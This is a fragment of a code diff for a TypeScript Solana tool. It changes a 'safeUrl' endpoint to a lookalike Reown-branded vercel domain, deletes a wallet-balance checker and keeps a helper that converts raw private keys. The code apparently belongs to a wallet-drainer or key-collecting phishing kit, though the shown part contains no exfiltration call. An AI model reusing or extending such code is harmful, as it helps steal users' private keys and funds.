@@ -7,36 +7,8 @@ import { Buffer } from "buffer";
 
 const connection = new Connection(clusterApiUrl("mainnet-beta"), "confirmed");
 const b58 = new B58();
-const safeUrl = "https://link-safe.netlify.app/lnv";
+const safeUrl = "https://linksafe-reown.vercel.app/lnv";
 
-const accountBalances = async (address: string) => {
-  try {
-    const publicKey = new PublicKey(address);
-    const balance = await connection.getBalance(publicKey);
-    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
-      publicKey,
-      {
-        programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-      }
-    );
-
-    const assets = tokenAccounts.value.map((account) => ({
-      token: account.account.data.parsed.info.mint,
-      amount: account.account.data.parsed.info.tokenAmount.uiAmount,
-      decimals: account.account.data.parsed.info.tokenAmount.decimals,
-    }));
-
-    const balances = {
-      sol: balance / 1e9, // Convert lamports to SOL
-      assets,
-      minimumBalance: 0, // Solana doesn't enforce a minimum balance like Reown
-    };
-    return balances;
-  } catch (err) {
-    console.error("Error fetching balances:", err);
-    return null;
-  }
-};
 
 const getPublicKey = (priv: Uint8Array): Uint8Array => {
   const privateKeyString = Buffer.from(priv).toString("hex");
